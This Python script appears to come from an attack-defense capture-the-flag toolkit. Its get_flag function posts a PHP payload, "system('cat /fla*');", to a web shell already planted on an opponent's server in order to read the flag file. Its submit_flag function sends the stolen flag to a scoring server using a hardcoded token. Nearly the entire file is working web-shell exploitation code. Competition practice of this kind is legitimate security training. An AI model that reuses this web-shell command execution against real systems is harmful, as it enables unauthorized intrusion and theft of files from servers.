#!/usr/bin/env python
# -*- coding: utf-8 -*-

from requests import *
from time import sleep
from module.php.config import shell_timeout
# (None | string) get_flag(url , key , salt_key)
# None | Error | shell is invaild
# string | flag
def get_flag(url , password , salt_key):
    data = {
        "key1" : salt_key,
        password : "system('cat /fla*');"
    }

    headers = {
        "Referer":"cxk is very beautidul!"
    }
    response = post(url, headers=headers,data = data, timeout = shell_timeout)
    content = response.content
    try:
        flag = content.replace("\n","")
        return flag
    except:
        print("Fixed!")
        return None


# boolean submit_flag(string flag)
def submit_flag(flag_key , flag ):
    # print(flag_key , flag)
    # return True
    bRet = False
    url = "http://172.16.4.1/Common/submitAnswer"
    data = {
        "answer" : flag,
        "token" : "760ed64dc873826f3316ae8115b8b26a"
    }
    resp = post(url , data = data)
    if resp.status_code == 200:
        resp.encoding = resp.apparent_encoding
        result = dict(resp.json())
        
        if result['status'] != 0:
            print(result['msg'])
            bRet = True
    sleep(3)
    return bRet

def main():
    get_flag("192.168.239.142",80,"deploy")



if __name__ == "__main__":
    main()
